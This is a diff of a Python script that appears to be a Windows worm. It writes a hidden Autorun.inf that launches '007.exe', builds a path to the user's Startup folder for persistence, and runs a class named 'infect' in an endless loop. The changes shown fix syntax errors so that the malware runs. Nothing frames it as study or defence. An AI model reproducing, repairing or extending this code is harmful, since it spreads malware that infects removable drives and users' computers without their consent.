@@ -5,13 +5,15 @@ import ctypes
 import win32con , win32api
 
 filename=sys.argv[0]
-work_home=r"C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\{1}\\Programs\\Startup".format(os.getlogin(),'Start Menu')
-def writeconfig:
+work_home=r"C:\Users\{0}\AppData\Roaming\Microsoft\Windows\{1}\Programs\Startup".format(os.getlogin(),'Start Menu')
+
+def writeconfig():
     autorun='''
-    [autorun]
-    open=007.exe
-    icon=007.exe
-    '''
+[autorun]
+open=007.exe
+icon=007.exe
+'''
+    
     with open("Autorun.inf",'w') as loadautorun:
         loadautorun.write(autorun)
     win32api.SetFileAttributes("Autorun.inf",win32con.FILE_ATTRIBUTE_HIDDEN)
@@ -58,7 +60,7 @@ class infect:
         except:
             pass
 
-def infecting:
+def infecting():
     while True:
         infect().go()
 
